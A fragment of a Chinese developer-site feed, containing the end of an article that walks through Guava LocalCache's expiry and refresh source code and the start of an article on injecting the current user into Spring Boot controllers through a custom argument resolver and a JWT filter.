       <span class="hljs-built_in">tryExpireEntries</span>(now);
       return null;
     }
     return value;
}

boolean <span class="hljs-built_in">isExpired</span>(ReferenceEntry&lt;K, V&gt; entry, long now) {
    <span class="hljs-built_in">checkNotNull</span>(entry);
    <span class="hljs-comment">// 如果配置了 expireAfterAccess ，比较当前时间和 Entry 的 accessTime 比较</span>
    if (expiresAfterAccess() &amp;&amp; (now - entry.getAccessTime() &gt;= expireAfterAccessNanos)) {
      returntrue;
    }
    <span class="hljs-comment">// 如果配置了 expireAfterWrite ，比较当前时间和 Entry 的 writeTime 比较</span>
    if (expiresAfterWrite() &amp;&amp; (now - entry.getWriteTime() &gt;= expireAfterWriteNanos)) {
      returntrue;
    }
    returnfalse;
}
</code></pre>
<blockquote>
<p>假如 Entry 的 key 为空，或者 vlaue 为空，或者过期了，则返回空 。</p>
</blockquote>
<h5 data-id="heading-19">C 调度刷新 scheduleRefresh</h5>
<pre><code class="hljs language-java" lang="java">V <span class="hljs-title function_">scheduleRefresh</span><span class="hljs-params">(
        ReferenceEntry&lt;K, V&gt; entry,
        K key,
        <span class="hljs-type">int</span> hash,
        V oldValue,
        <span class="hljs-type">long</span> now,
        CacheLoader&lt;? <span class="hljs-built_in">super</span> K, V&gt; loader)</span> {
       <span class="hljs-comment">//1、是否配置了 refreshAfterWrite</span>
       <span class="hljs-comment">//2、用 writeTime 判断是否达到刷新的时间</span>
       <span class="hljs-comment">//3、是否在加载中，如果是则没必要再进行刷新</span>
      <span class="hljs-keyword">if</span> (map.refreshes()
          &amp;&amp; (now - entry.getWriteTime() &gt; map.refreshNanos)
          &amp;&amp; !entry.getValueReference().isLoading()) {
          <span class="hljs-type">V</span> <span class="hljs-variable">newValue</span> <span class="hljs-operator">=</span> refresh(key, hash, loader, <span class="hljs-literal">true</span>);
          <span class="hljs-keyword">if</span> (newValue != <span class="hljs-literal">null</span>) {
              <span class="hljs-keyword">return</span> newValue;
          }
      }
     <span class="hljs-keyword">return</span> oldValue;
}
</code></pre>
<p>调度刷新方法会判断三个条件 ：</p>
<ul>
<li>配置了刷新时间 refreshAfterWrite</li>
<li>当前时间减去 Entry 的写入时间大于刷新时间</li>
<li>当前 Entry 未处于加载中</li>
</ul>
<p>当满足了三个条件之后，调用 refresh 方法，当异步加载成功后，返回新值。</p>
<pre><code class="hljs language-scss" lang="scss">V <span class="hljs-built_in">refresh</span>(K key, int hash, CacheLoader&lt;? super K, V&gt; loader, boolean checkTime) {
     <span class="hljs-comment">//插入一个 LoadingValueReference ，实质是把对应Entry的ValueReference替换为新建的LoadingValueReference</span>
     final LoadingValueReference&lt;K, V&gt; loadingValueReference =
         <span class="hljs-built_in">insertLoadingValueReference</span>(key, hash, checkTime);
     if (loadingValueReference == null) {
       returnnull;
     }
     <span class="hljs-comment">// 调用异步加载方法loadAsync</span>
     ListenableFuture&lt;V&gt; result = <span class="hljs-built_in">loadAsync</span>(key, hash, loadingValueReference, loader);
     if (result.isDone()) {
       try {
         return Uninterruptibles<span class="hljs-selector-class">.getUninterruptibly</span>(result);
       } catch (Throwable t) {
         <span class="hljs-comment">// don't let refresh exceptions propagate; error was already logged</span>
       }
     }
     returnnull;
}
</code></pre>
<p>首先将 Entry 对象的 ValueReference 包装为新建的 LoadingValueReference , 表明当前对象正在加载中。</p>
<pre><code class="hljs language-ini" lang="ini">LoadingValueReference&lt;K, V&gt; insertLoadingValueReference(
        final K key, final int hash, boolean checkTime) {
      ReferenceEntry&lt;K, V&gt; <span class="hljs-attr">e</span> = null<span class="hljs-comment">;</span>
      lock()<span class="hljs-comment">;</span>
      try {
        long <span class="hljs-attr">now</span> = map.ticker.read()<span class="hljs-comment">;</span>
        preWriteCleanup(now)<span class="hljs-comment">;</span>
        AtomicReferenceArray&lt;ReferenceEntry&lt;K, V&gt;&gt; <span class="hljs-attr">table</span> = this.table<span class="hljs-comment">;</span>
        int <span class="hljs-attr">index</span> = hash &amp; (table.length() - <span class="hljs-number">1</span>)<span class="hljs-comment">;</span>
        ReferenceEntry&lt;K, V&gt; <span class="hljs-attr">first</span> = table.get(index)<span class="hljs-comment">;</span>
        // Look for an existing entry.
        for (<span class="hljs-attr">e</span> = first<span class="hljs-comment">; e != null; e = e.getNext()) {</span>
          K <span class="hljs-attr">entryKey</span> = e.getKey()<span class="hljs-comment">;</span>
          if (e.getHash() == hash
              &amp;&amp; entryKey != null
              &amp;&amp; map.keyEquivalence.equivalent(key, entryKey)) {
            // We found an existing entry.
            ValueReference&lt;K, V&gt; <span class="hljs-attr">valueReference</span> = e.getValueReference()<span class="hljs-comment">;</span>
            if (valueReference.isLoading()
                || (checkTime &amp;&amp; (now - e.getWriteTime() &lt; map.refreshNanos))) {
              // refresh is a no-op if loading is pending
              // if checkTime, we want to check *after* acquiring the lock if refresh still needs
              // to be scheduled
              returnnull<span class="hljs-comment">;</span>
            }
            // continue returning old value while loading
            ++modCount<span class="hljs-comment">;</span>
            LoadingValueReference&lt;K, V&gt; <span class="hljs-attr">loadingValueReference</span> =
                new LoadingValueReference&lt;&gt;(valueReference)<span class="hljs-comment">;</span>
            e.setValueReference(loadingValueReference)<span class="hljs-comment">;</span>
            return loadingValueReference<span class="hljs-comment">;</span>
          }
        }
        ++modCount<span class="hljs-comment">;</span>
        LoadingValueReference&lt;K, V&gt; <span class="hljs-attr">loadingValueReference</span> = new LoadingValueReference&lt;&gt;()<span class="hljs-comment">;</span>
        <span class="hljs-attr">e</span> = newEntry(key, hash, first)<span class="hljs-comment">;</span>
        e.setValueReference(loadingValueReference)<span class="hljs-comment">;</span>
        table.set(index, e)<span class="hljs-comment">;</span>
        return loadingValueReference<span class="hljs-comment">;</span>
      } finally {
        unlock()<span class="hljs-comment">;</span>
        postWriteCleanup()<span class="hljs-comment">;</span>
      }
}
</code></pre>
<p>接下来，分析异步加载<code>loadAsync</code>方法：</p>
<pre><code class="hljs language-scss" lang="scss">ListenableFuture&lt;V&gt; <span class="hljs-built_in">loadAsync</span>(
        final K key,
        final int hash,
        final LoadingValueReference&lt;K, V&gt; loadingValueReference,
        CacheLoader&lt;? super K, V&gt; loader) {
      final ListenableFuture&lt;V&gt; loadingFuture = loadingValueReference<span class="hljs-selector-class">.loadFuture</span>(key, loader);
      loadingFuture<span class="hljs-selector-class">.addListener</span>(
          new Runnable() {
            <span class="hljs-keyword">@Override</span>
            public void run() {
              try {
                <span class="hljs-built_in">getAndRecordStats</span>(key, hash, loadingValueReference, loadingFuture);
              } catch (Throwable t) {
                logger<span class="hljs-selector-class">.log</span>(Level.WARNING, "Exception thrown during refresh", t);
                loadingValueReference<span class="hljs-selector-class">.setException</span>(t);
              }
            }
          },
          <span class="hljs-built_in">directExecutor</span>());
      return loadingFuture;
}

public ListenableFuture&lt;V&gt; <span class="hljs-built_in">loadFuture</span>(K key, CacheLoader&lt;? super K, V&gt; loader) {
      try {
        <span class="hljs-comment">// 记录耗时时间 </span>
        stopwatch<span class="hljs-selector-class">.start</span>();
        V previousValue = oldValue<span class="hljs-selector-class">.get</span>();
        if (previousValue == null) {
          V newValue = loader<span class="hljs-selector-class">.load</span>(key);
          return <span class="hljs-built_in">set</span>(newValue) ? futureValue : Futures.<span class="hljs-built_in">immediateFuture</span>(newValue);
        }
        ListenableFuture&lt;V&gt; newValue = loader<span class="hljs-selector-class">.reload</span>(key, previousValue);
        if (newValue == null) {
          return Futures<span class="hljs-selector-class">.immediateFuture</span>(null);
        }
        <span class="hljs-comment">// To avoid a race, make sure the refreshed value is set into loadingValueReference</span>
        <span class="hljs-comment">// *before* returning newValue from the cache query.</span>
        return <span class="hljs-attribute">transform</span>(
            newValue,
            new com.google.common.base.Function&lt;V, V&gt;() {
              <span class="hljs-keyword">@Override</span>
              public V apply(V newValue) {
                LoadingValueReference<span class="hljs-selector-class">.this</span><span class="hljs-selector-class">.set</span>(newValue);
                return newValue;
              }
            },
            <span class="hljs-built_in">directExecutor</span>());
      } catch (Throwable t) {
        ListenableFuture&lt;V&gt; result = <span class="hljs-built_in">setException</span>(t) ? futureValue : <span class="hljs-built_in">fullyFailedFuture</span>(t);
        if (t instanceof InterruptedException) {
          Thread<span class="hljs-selector-class">.currentThread</span>()<span class="hljs-selector-class">.interrupt</span>();
        }
        return result;
      }
 }
</code></pre>
<p>loadAsync 方法流程：</p>
<ol>
<li>调用 loadingValueReference 对象的 loadFuture 方法，假如旧数据为空值，则同步调用加载器 loader 的 load 方法 ，并返回包装了新值的 Future 。</li>
<li>假如旧数据不为空值，则调用加载器 loader 的 reload 方法（<strong>此处可以重新实现为异步的方式</strong>），经过转换操作返回包装了新值的 Future 。</li>
<li>将新的值存储在 Entry 对象里。</li>
</ol>
<h6 data-id="heading-20">D 查询/加载 lockedGetOrLoad</h6>
<p>如果之前没有写入过数据 、 数据已经过期、 数据不是在加载中，则会调用<code>lockedGetOrLoad</code>方法。</p>
<pre><code class="hljs language-ini" lang="ini">V lockedGetOrLoad(K key, int hash, CacheLoader&lt;? super K, V&gt; loader) throws ExecutionException {
    ReferenceEntry&lt;K, V&gt; e<span class="hljs-comment">;</span>
    ValueReference&lt;K, V&gt; <span class="hljs-attr">valueReference</span> = null<span class="hljs-comment">;</span>
    LoadingValueReference&lt;K, V&gt; <span class="hljs-attr">loadingValueReference</span> = null<span class="hljs-comment">;</span>
    //用来判断是否需要创建一个新的Entry
    boolean <span class="hljs-attr">createNewEntry</span> = <span class="hljs-literal">true</span><span class="hljs-comment">;</span>
    //segment上锁
    lock()<span class="hljs-comment">;</span>
    try {
      // re-read ticker once inside the lock
      long <span class="hljs-attr">now</span> = map.ticker.read()<span class="hljs-comment">;</span>
      //做一些清理工作
      preWriteCleanup(now)<span class="hljs-comment">;</span>

      int <span class="hljs-attr">newCount</span> = this.count - <span class="hljs-number">1</span><span class="hljs-comment">;</span>
      AtomicReferenceArray&lt;ReferenceEntry&lt;K, V&gt;&gt; <span class="hljs-attr">table</span> = this.table<span class="hljs-comment">;</span>
      int <span class="hljs-attr">index</span> = hash &amp; (table.length() - <span class="hljs-number">1</span>)<span class="hljs-comment">;</span>
      ReferenceEntry&lt;K, V&gt; <span class="hljs-attr">first</span> = table.get(index)<span class="hljs-comment">;</span>

      //通过key定位entry
      for (<span class="hljs-attr">e</span> = first<span class="hljs-comment">; e != null; e = e.getNext()) {</span>
        K <span class="hljs-attr">entryKey</span> = e.getKey()<span class="hljs-comment">;</span>
        if (e.getHash() == hash
            &amp;&amp; entryKey != null
            &amp;&amp; map.keyEquivalence.equivalent(key, entryKey)) {
          //找到entry
          <span class="hljs-attr">valueReference</span> = e.getValueReference()<span class="hljs-comment">;</span>
          //如果value在加载中则不需要重复创建entry
          if (valueReference.isLoading()) {
            <span class="hljs-attr">createNewEntry</span> = <span class="hljs-literal">false</span><span class="hljs-comment">;</span>
          } else {
            V <span class="hljs-attr">value</span> = valueReference.get()<span class="hljs-comment">;</span>
            //value为null说明已经过期且被清理掉了
            if (<span class="hljs-attr">value</span> == null) {
              //写通知queue
              enqueueNotification(
                  entryKey, hash, value, valueReference.getWeight(), RemovalCause.COLLECTED)<span class="hljs-comment">;</span>
            //过期但还没被清理
            } elseif (map.isExpired(e, now)) {
              //写通知queue
              // This is a duplicate check, as preWriteCleanup already purged expired
              // entries, but let's accomodate an incorrect expiration queue.
              enqueueNotification(
                  entryKey, hash, value, valueReference.getWeight(), RemovalCause.EXPIRED)<span class="hljs-comment">;</span>
            } else {
              recordLockedRead(e, now)<span class="hljs-comment">;</span>
              statsCounter.recordHits(1)<span class="hljs-comment">;</span>
              //其他情况则直接返回value
              //来到这步，是不是觉得有点奇怪，我们分析一下: 
              //进入lockedGetOrLoad方法的条件是数据已经过期 || 数据不是在加载中，但是在lock之前都有可能发生并发，进而改变entry的状态，所以在上面中再次判断了isLoading和isExpired。所以来到这步说明，原来数据是过期的且在加载中，lock的前一刻加载完成了，到了这步就有值了。
              return value<span class="hljs-comment">;</span>
            }
            writeQueue.remove(e)<span class="hljs-comment">;</span>
            accessQueue.remove(e)<span class="hljs-comment">;</span>
            <span class="hljs-attr">this.count</span> = newCount<span class="hljs-comment">; // write-volatile</span>
          }
          break<span class="hljs-comment">;</span>
        }
      }
      //创建一个Entry，且set一个新的 LoadingValueReference。
      if (createNewEntry) {
        <span class="hljs-attr">loadingValueReference</span> = new LoadingValueReference&lt;&gt;()<span class="hljs-comment">;</span>

        if (<span class="hljs-attr">e</span> == null) {
          <span class="hljs-attr">e</span> = newEntry(key, hash, first)<span class="hljs-comment">;</span>
          e.setValueReference(loadingValueReference)<span class="hljs-comment">;</span>
          table.set(index, e)<span class="hljs-comment">;</span>
        } else {
          e.setValueReference(loadingValueReference)<span class="hljs-comment">;</span>
        }
      }
    } finally {
      unlock()<span class="hljs-comment">;</span>
      postWriteCleanup()<span class="hljs-comment">;</span>
    }
    //同步加载数据
    if (createNewEntry) {
      try {
        synchronized (e) {
          return loadSync(key, hash, loadingValueReference, loader)<span class="hljs-comment">;</span>
        }
      } finally {
        statsCounter.recordMisses(1)<span class="hljs-comment">;</span>
      }
    } else {
      // The entry already exists. Wait for loading.
      return waitForLoadingValue(e, key, valueReference)<span class="hljs-comment">;</span>
    }
}
</code></pre>
<h2 data-id="heading-21">5 总结</h2>
<p>通过解析 Guava Cache 的实现原理，我们发现 Guava LocalCache 与 ConcurrentHashMap 有以下不同：</p>
<ol>
<li>
<p>ConcurrentHashMap ”分段控制并发“是隐式的（实现中没有Segment对象），而 LocalCache 是显式的。</p>
<p>在 JDK 1.8 之后，ConcurrentHashMap 采用<code>synchronized + CAS</code> 实现：当 put 的元素在哈希桶数组中不存在时，直接 CAS 进行写操作；在发生哈希冲突的情况下使用 synchronized 锁定头节点。其实是比分段锁更细粒度的锁实现，只在特定场景下锁定其中一个哈希桶，降低锁的影响范围。</p>
</li>
<li>
<p>Guava Cache 使用 ReferenceEntry 来封装键值对，并且对于值来说，还额外实现了 ValueReference 引用对象来封装对应 Value 对象。</p>
</li>
<li>
<p>Guava Cache 支持过期 + 自动 loader 机制，这也使得其加锁方式与 ConcurrentHashMap 不同。</p>
</li>
<li>
<p>Guava Cache 支持 segment 粒度上支持了 LRU 机制， 体现在 Segment 上就是 writeQueue 和 accessQueue。</p>
<p>队列中的元素按照访问或者写时间排序，新的元素会被添加到队列尾部。如果，在队列中已经存在了该元素，则会先delete掉，然后再尾部添加该节点。</p>
</li>
</ol></div></div></article> <div class="article-end" data-v-539963b4="" data-v-61fb5e44=""><div class="rank-entry-bottom" data-v-539963b4="" data-v-61fb5e44=""><!----></div> <div class="tag-list-box" data-v-539963b4="" data-v-61fb5e44=""><!----><!----><!----></div></div> <!----><!----><!----><!----><!----><style>	.markdown-body { color: #828182;}</style>]]></description></item><item>    <title><![CDATA[SpringBoot实现隐式参数注入]]></title>    <link>https://juejin.cn/post/7591942733365231650</link>    <guid>https://juejin.cn/post/7591942733365231650</guid>    <pubDate>2026-01-06T07:03:18.000Z</pubDate>    <description><![CDATA[<article itemscope="itemscope" itemtype="http://schema.org/Article" data-entry-id="7591942733365231650" data-draft-id="7591942733365149730" data-original-type="0" class="article" data-v-61fb5e44=""><!----> <meta itemprop="headline" content="SpringBoot实现隐式参数注入"/> <meta itemprop="keywords" content="JavaScript"/> <meta itemprop="datePublished" content="2026-01-06T07:03:18.000Z"/> <meta itemprop="image" content="https://p1-jj.byteimg.com/tos-cn-i-t2oaga2asx/gold-assets/icon/icon-128.png~tplv-t2oaga2asx-image.image"/> <div itemprop="author" itemscope="itemscope" itemtype="http://schema.org/Person"><meta itemprop="name" content="Java编程爱好者"/> <meta itemprop="url" content="https://juejin.cn/user/819554264300154"/></div> <div itemprop="publisher" itemscope="itemscope" itemtype="http://schema.org/Organization"><meta itemprop="name" content="掘金"/> <div itemprop="logo" itemscope="itemscope" itemtype="https://schema.org/ImageObject"><meta itemprop="url" content="https://p1-jj.byteimg.com/tos-cn-i-t2oaga2asx/gold-assets/icon/icon-white-180.png~tplv-t2oaga2asx-image.image"/> <meta itemprop="width" content="180"/> <meta itemprop="height" content="180"/></div></div> <h1 class="article-title" data-v-61fb5e44="">
            SpringBoot实现隐式参数注入
            <!----> <!----></h1> <div class="author-info-block block-hidden" data-v-61fb5e44=""><div class="author-info-box" data-v-61fb5e44=""><div class="author-name" data-v-61fb5e44=""><a href="/user/819554264300154/posts" target="_blank" rel="" class="jj-link username username ellipsis" data-v-65b50b51="" data-v-292f6e48="" data-v-61fb5e44=""><span class="name" style="max-width:160px;" data-v-65b50b51="" data-v-292f6e48="">
    Java编程爱好者
  </span> <!----> <!----> <!----> </a></div> <div class="meta-box" data-v-61fb5e44=""><time datetime="2026-01-06T07:03:18.000Z" title="Tue Jan 06 2026 07:03:18 GMT+0000 (Coordinated Universal Time)" class="time" data-v-61fb5e44="">
                    2026-01-06
                  </time> <svg width="16" height="16" viewbox="0 0 16 16" fill="none" xmlns="http://www.w3.org/2000/svg" class="read-icon" data-v-61fb5e44=""><path d="M7.90078 2.80078C4.49278 2.80078 1.74745 6.11672 0.800781 7.77469C1.74745 9.58339 4.49278 13.2008 7.90078 13.2008C11.3088 13.2008 14.0541 9.58339 15.0008 7.77469C14.0541 6.11672 11.3088 2.80078 7.90078 2.80078Z" stroke="currentColor" data-v-61fb5e44=""/><circle cx="7.89922" cy="8.00078" r="2.2" stroke="currentColor" data-v-61fb5e44=""/></svg> <span class="views-count" data-v-61fb5e44="">
                    0
                  </span> <span class="read-time" data-v-61fb5e44=""><svg width="16" height="16" viewbox="0 0 16 16" fill="none" xmlns="http://www.w3.org/2000/svg" data-v-61fb5e44=""><rect width="16" height="16" fill="none" data-v-61fb5e44=""/><circle cx="8" cy="8" r="5.65625" stroke="#8A919F" data-v-61fb5e44=""/><path d="M7.69141 5.18652V8.30924H10.8141" stroke="#8A919F" stroke-linecap="round" stroke-linejoin="round" data-v-61fb5e44=""/></svg>
                    阅读7分钟
                  </span> <!----></div></div> <div style="flex:1;" data-v-61fb5e44=""/> <!----> <!----></div> <!----> <!----> <!----> <!----> <div id="article-root" itemprop="articleBody" class="main" data-v-61fb5e44=""><div class="article-viewer markdown-body result"><style>.markdown-body{word-break:break-word;line-height:1.75;font-weight:400;font-size:16px;overflow-x:hidden;color:#252933}.markdown-body h1,.markdown-body h2,.markdown-body h3,.markdown-body h4,.markdown-body h5,.markdown-body h6{line-height:1.5;margin-top:35px;margin-bottom:10px;padding-bottom:5px}.markdown-body h1{font-size:24px;line-height:38px;margin-bottom:5px}.markdown-body h2{font-size:22px;line-height:34px;padding-bottom:12px;border-bottom:1px solid #ececec}.markdown-body h3{font-size:20px;line-height:28px}.markdown-body h4{font-size:18px;line-height:26px}.markdown-body h5{font-size:17px;line-height:24px}.markdown-body h6{font-size:16px;line-height:24px}.markdown-body p{line-height:inherit;margin-top:22px;margin-bottom:22px}.markdown-body img{max-width:100%}.markdown-body hr{border:none;border-top:1px solid #ddd;margin-top:32px;margin-bottom:32px}.markdown-body code{word-break:break-word;border-radius:2px;overflow-x:auto;background-color:#fff5f5;color:#ff502c;font-size:.87em;padding:.065em .4em}.markdown-body code,.markdown-body pre{font-family:Menlo,Monaco,Consolas,Courier New,monospace}.markdown-body pre{overflow:auto;position:relative;line-height:1.75}.markdown-body pre&gt;code{font-size:12px;padding:15px 12px;margin:0;word-break:normal;display:block;overflow-x:auto;color:#333;background:#f8f8f8}.markdown-body a{text-decoration:none;color:#0269c8;border-bottom:1px solid #d1e9ff}.markdown-body a:active,.markdown-body a:hover{color:#275b8c}.markdown-body table{display:inline-block!important;font-size:12px;width:auto;max-width:100%;overflow:auto;border:1px solid #f6f6f6}.markdown-body thead{background:#f6f6f6;color:#000;text-align:left}.markdown-body tr:nth-child(2n){background-color:#fcfcfc}.markdown-body td,.markdown-body th{padding:12px 7px;line-height:24px}.markdown-body td{min-width:120px}.markdown-body blockquote{color:#666;padding:1px 23px;margin:22px 0;border-left:4px solid #cbcbcb;background-color:#f8f8f8}.markdown-body blockquote:after{display:block;content:""}.markdown-body blockquote&gt;p{margin:10px 0}.markdown-body ol,.markdown-body ul{padding-left:28px}.markdown-body ol li,.markdown-body ul li{margin-bottom:0;list-style:inherit}.markdown-body ol li .task-list-item,.markdown-body ul li .task-list-item{list-style:none}.markdown-body ol li .task-list-item ol,.markdown-body ol li .task-list-item ul,.markdown-body ul li .task-list-item ol,.markdown-body ul li .task-list-item ul{margin-top:0}.markdown-body ol ol,.markdown-body ol ul,.markdown-body ul ol,.markdown-body ul ul{margin-top:3px}.markdown-body ol li{padding-left:6px}.markdown-body .contains-task-list{padding-left:0}.markdown-body .task-list-item{list-style:none}@media (max-width:720px){.markdown-body h1{font-size:24px}.markdown-body h2{font-size:20px}.markdown-body h3{font-size:18px}}</style><style data-highlight="" data-highlight-key="juejin">.markdown-body pre,.markdown-body pre&gt;code.hljs{color:#333;background:#f8f8f8}.hljs-comment,.hljs-quote{color:#998;font-style:italic}.hljs-keyword,.hljs-selector-tag,.hljs-subst{color:#333;font-weight:700}.hljs-literal,.hljs-number,.hljs-tag .hljs-attr,.hljs-template-variable,.hljs-variable{color:teal}.hljs-doctag,.hljs-string{color:#d14}.hljs-section,.hljs-selector-id,.hljs-title{color:#900;font-weight:700}.hljs-subst{font-weight:400}.hljs-class .hljs-title,.hljs-type{color:#458;font-weight:700}.hljs-attribute,.hljs-name,.hljs-tag{color:navy;font-weight:400}.hljs-link,.hljs-regexp{color:#009926}.hljs-bullet,.hljs-symbol{color:#990073}.hljs-built_in,.hljs-builtin-name{color:#0086b3}.hljs-meta{color:#999;font-weight:700}.hljs-deletion{background:#fdd}.hljs-addition{background:#dfd}.hljs-emphasis{font-style:italic}.hljs-strong{font-weight:700}</style><h2 data-id="heading-0">前言：一个痛点</h2>
<p>想象一下这样的场景：用户请求带着 JWT Token 进入你的系统，Filter 层面解析 Token 得到用户 ID，接下来需要：</p>
<ul>
<li>在 Controller 层获取用户信息</li>
<li>在 Service 层进行权限验证</li>
<li>在某些业务逻辑中记录操作日志</li>
</ul>
<p>每一个环节都需要知道"当前用户是谁"，看看目前常用的解决方案。</p>
<h2 data-id="heading-1">传统方案的"缺陷"</h2>
<p><strong>方案一：<a href="https://link.juejin.cn?target=https%3A%2F%2Fzhida.zhihu.com%2Fsearch%3Fcontent_id%3D266261738%26content_type%3DArticle%26match_order%3D1%26q%3DThreadLocal%26zhida_source%3Dentity" target="_blank" title="https://zhida.zhihu.com/search?content_id=266261738&amp;content_type=Article&amp;match_order=1&amp;q=ThreadLocal&amp;zhida_source=entity" ref="nofollow noopener noreferrer">ThreadLocal</a></strong></p>
<pre><code class="hljs language-swift" lang="swift"><span class="hljs-comment">// 看起来很"Hack"</span>
<span class="hljs-keyword">private</span> <span class="hljs-keyword">static</span> <span class="hljs-keyword">final</span> <span class="hljs-type">ThreadLocal</span>&lt;<span class="hljs-type">Long</span>&gt; currentUser <span class="hljs-operator">=</span> new <span class="hljs-type">ThreadLocal</span>&lt;&gt;();
</code></pre>
<ul>
<li><strong>线程安全问题</strong>：在异步环境下可能出现数据错乱</li>
<li><strong>内存泄漏风险</strong>：ThreadLocal 使用不当可能导致内存泄漏</li>
<li><strong>代码可读性差</strong>：隐式的数据传递方式让代码逻辑变得难以追踪</li>
</ul>
<p><strong>方案二：<a href="https://link.juejin.cn?target=https%3A%2F%2Fzhida.zhihu.com%2Fsearch%3Fcontent_id%3D266261738%26content_type%3DArticle%26match_order%3D1%26q%3DHttpServletRequest%26zhida_source%3Dentity" target="_blank" title="https://zhida.zhihu.com/search?content_id=266261738&amp;content_type=Article&amp;match_order=1&amp;q=HttpServletRequest&amp;zhida_source=entity" ref="nofollow noopener noreferrer">HttpServletRequest</a>.setAttribute()</strong></p>
<pre><code class="hljs language-kotlin" lang="kotlin"><span class="hljs-comment">// 看起来很"丑"</span>
<span class="hljs-meta">@GetMapping(<span class="hljs-string">"/me"</span>)</span>
<span class="hljs-keyword">public</span> User getMyProfile(HttpServletRequest request) {
    <span class="hljs-built_in">Long</span> userId = (<span class="hljs-built_in">Long</span>) request.getAttribute(<span class="hljs-string">"currentUserId"</span>);
    <span class="hljs-keyword">return</span> userService.getById(userId);
}
</code></pre>
<ul>
<li><strong>类型不安全</strong>：需要手动进行类型转换，容易出现 ClassCastException</li>
<li><strong>代码冗余</strong>：每个需要用户信息的 Controller 都要重复相同的逻辑</li>
<li><strong>违反了 Controller 的"纯净性"</strong> ：引入了 Servlet API 依赖</li>
<li><strong>字符串魔法值</strong>：属性名称容易写错，编译时无法检查</li>
</ul>
<h2 data-id="heading-2"><a href="https://link.juejin.cn?target=https%3A%2F%2Fzhida.zhihu.com%2Fsearch%3Fcontent_id%3D266261738%26content_type%3DArticle%26match_order%3D1%26q%3DSpring%2BMVC%26zhida_source%3Dentity" target="_blank" title="https://zhida.zhihu.com/search?content_id=266261738&amp;content_type=Article&amp;match_order=1&amp;q=Spring+MVC&amp;zhida_source=entity" ref="nofollow noopener noreferrer">Spring MVC</a>：HandlerMethodArgumentResolver</h2>
<p>Spring MVC 提供了一个解决方案：<strong>自定义参数解析器（HandlerMethodArgumentResolver）</strong> 。</p>
<p>这个设计模式体现了 Spring 框架一贯的"约定优于配置"的理念。它不要求我们改变 Filter 层面的实现，而是在参数解析这个环节做文章，通过扩展框架的能力来解决问题。</p>
<h2 data-id="heading-3">设计思路</h2>
<p>Spring MVC 的 HandlerMethodArgumentResolver 机制实际上是一种"适配器模式"的应用。它将不同来源的参数（Request 参数、Path 变量、Header 信息、Session 数据等）统一适配成 Controller 方法可以直接使用的形式。</p>
<p>这种设计的巧妙之处在于：</p>
<ul>
<li><strong>职责分离</strong>：Filter 负责认证和设置状态，Resolver 负责参数转换</li>
<li><strong>可扩展性</strong>：可以轻松添加新的参数解析逻辑</li>
<li><strong>无侵入性</strong>：不影响现有的代码结构</li>
</ul>
<p>这个方案的核心思想是：<strong>将 request.getAttribute() 操作，封装成类型安全的方法参数</strong>。</p>
<h2 data-id="heading-4">核心实现</h2>
<h2 data-id="heading-5">第一步：创建自定义注解</h2>
<pre><code class="hljs language-less" lang="less"><span class="hljs-variable">@Target</span>(ElementType.PARAMETER)
<span class="hljs-variable">@Retention</span>(RetentionPolicy.RUNTIME)
public <span class="hljs-variable">@interface</span> CurrentUser {
}
</code></pre>
<h2 data-id="heading-6">第二步：实现参数解析器</h2>
<pre><code class="hljs language-java" lang="java"><span class="hljs-meta">@Component</span>
<span class="hljs-keyword">public</span> <span class="hljs-keyword">class</span> <span class="hljs-title class_">CurrentUserArgumentResolver</span> <span class="hljs-keyword">implements</span> <span class="hljs-title class_">HandlerMethodArgumentResolver</span> {

    <span class="hljs-meta">@Override</span>
    <span class="hljs-keyword">public</span> <span class="hljs-type">boolean</span> <span class="hljs-title function_">supportsParameter</span><span class="hljs-params">(MethodParameter parameter)</span> {
        <span class="hljs-comment">// 只解析被 @CurrentUser 标记的参数</span>
        <span class="hljs-keyword">return</span> parameter.hasParameterAnnotation(CurrentUser.class);
    }

    <span class="hljs-meta">@Override</span>
    <span class="hljs-keyword">public</span> Object <span class="hljs-title function_">resolveArgument</span><span class="hljs-params">(MethodParameter parameter,
                                 ModelAndViewContainer mavContainer,
                                 NativeWebRequest webRequest,
                                 WebDataBinderFactory binderFactory)</span> <span class="hljs-keyword">throws</span> Exception {
        <span class="hljs-comment">// 从 request 中获取之前设置的用户ID</span>
        <span class="hljs-keyword">return</span> webRequest.getAttribute(<span class="hljs-string">"currentUserId"</span>, WebRequest.SCOPE_REQUEST);
    }
}
</code></pre>
<h2 data-id="heading-7">第三步：注册解析器</h2>
<pre><code class="hljs language-typescript" lang="typescript"><span class="hljs-meta">@Configuration</span>
<span class="hljs-keyword">public</span> <span class="hljs-keyword">class</span> <span class="hljs-title class_">WebMvcConfig</span> <span class="hljs-keyword">implements</span> <span class="hljs-title class_">WebMvcConfigurer</span> {

    <span class="hljs-meta">@Autowired</span>
    <span class="hljs-keyword">private</span> <span class="hljs-title class_">CurrentUserArgumentResolver</span> currentUserArgumentResolver;

    <span class="hljs-meta">@Override</span>
    <span class="hljs-keyword">public</span> <span class="hljs-built_in">void</span> <span class="hljs-title function_">addArgumentResolvers</span>(<span class="hljs-params">List&lt;HandlerMethodArgumentResolver&gt; resolvers</span>) {
        resolvers.<span class="hljs-title function_">add</span>(currentUserArgumentResolver);
    }
}
</code></pre>
<h2 data-id="heading-8">方案示例</h2>
<h2 data-id="heading-9">Filter 层面</h2>
<pre><code class="hljs language-scala" lang="scala"><span class="hljs-meta">@Component</span>
public <span class="hljs-class"><span class="hljs-keyword">class</span> <span class="hljs-title">JwtAuthenticationFilter</span> <span class="hljs-keyword">extends</span> <span class="hljs-title">OncePerRequestFilter</span> </span>{

    <span class="hljs-meta">@Autowired</span>
    <span class="hljs-keyword">private</span> <span class="hljs-type">JwtService</span> jwtService;

    <span class="hljs-meta">@Override</span>
    <span class="hljs-keyword">protected</span> void doFilterInternal(<span class="hljs-type">HttpServletRequest</span> request,
                                   <span class="hljs-type">HttpServletResponse</span> response,
                                   <span class="hljs-type">FilterChain</span> filterChain) <span class="hljs-keyword">throws</span> <span class="hljs-type">ServletException</span>, <span class="hljs-type">IOException</span> {

        <span class="hljs-type">String</span> authorizationHeader = request.getHeader(<span class="hljs-string">"Authorization"</span>);

        <span class="hljs-keyword">if</span> (authorizationHeader != <span class="hljs-literal">null</span> &amp;&amp; authorizationHeader.startsWith(<span class="hljs-string">"Bearer "</span>)) {
            <span class="hljs-type">String</span> token = authorizationHeader.substring(<span class="hljs-number">7</span>);
            <span class="hljs-keyword">try</span> {
                <span class="hljs-type">Long</span> userId = jwtService.extractUserId(token);
                <span class="hljs-comment">// 标准：使用 request.setAttribute 设置</span>
